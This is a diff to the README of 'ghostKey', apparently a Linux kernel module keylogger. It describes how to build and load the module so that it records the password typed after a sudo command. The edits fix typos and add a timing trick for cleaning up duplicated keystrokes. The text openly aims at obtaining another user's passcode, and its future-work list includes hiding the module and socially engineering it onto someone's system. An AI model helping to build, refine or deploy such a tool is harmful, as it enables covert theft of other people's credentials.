@@ -16,7 +16,7 @@ It is important to note that normally in an interrupt handler pr_info() should n
 in our key logger, however, these issues are not large enough to enable us to create a solution. This project
 could be imporved upon by threading our kernel module, as well as printing output to a seperate server. If one would
 actually want to get a users passcode, they must add functionality to this module, as it does not yet print output
-to a seprate server, rather, it prints to the same device in which the module is located on. <br />
+to a seperate server, rather, it prints to the same device in which the module is located on. <br />
 
 ## Understanding the Code
   - 28/29: Needed for module and kernel functionality.<br />
@@ -47,16 +47,17 @@ to a seprate server, rather, it prints to the same device in which the module is
   Step 2: CD to the destination at which the cloned files are located.<br />
   Step 3: If you do not have the 'ghostKey.ko' file, run the 'make' command.<br />
   Step 4: Type in 'sudo insmod ghostKey.ko'<br />
-  Step 5: Upon 'sudo <command> <enter> recording will start.<br />
-  Step 6: The next text typed in will be considered a password and will be stored.<br />
+  Step 5: Upon 'sudo <command> <enter>' recording will start.<br />
+  Step 6: The next text typed in will be considered a password and will be stored after an 'enter' press.<br />
   Step 7: Type in 'sudo rmmod ghostKey.ko'<br />
   Step 8: To view the information 'sudo dmesg'<br />
   
 ## Important Note
 Occasionally the printed out password will involve a certain key multiplied by a certain amount. An example of this
-is the key 'a' being outputted two too many times. This seems to be an issue with pr_info inside of a handler, as it
-is somehow getting interuppted and considtly repeating the print. However, this does not stop the possibility of obtaining a users passcode.
-Through extensive testing, this issue will only less than 20% of the time, depending on what is happening on your machine.
+is the key 'a' being outputted two too many times. This seems to be an issue with pr_info() inside of a handler, as it
+is somehow getting interuppted and constantly repeating the print. However, this does not stop the possibility of obtaining a users passcode.
+Through extensive testing, this issue will only occur less than 20% of the time, depending on what is happening on your machine.
+Also, this issue can be easily solved by looking at what time certain keys are pressed, as repeats are normally at inhumane speeds.
 An assumption is also made that a user will type in their password correctly more times than incorrectly. To sucessfully obtain
 a users password the module must be left on a machine for a significant amount of time, then data should be compared of every password input.<br />
   
@@ -67,6 +68,7 @@ like to add over time.
   - A seperate program to read through all of the data and generate a guess on what the password is.
   - Ways to hide the Linux Module on the system.
   - Ways of socially engineering the module onto someones system.
+  - Threading the Linux Kernel Module
   
   
   
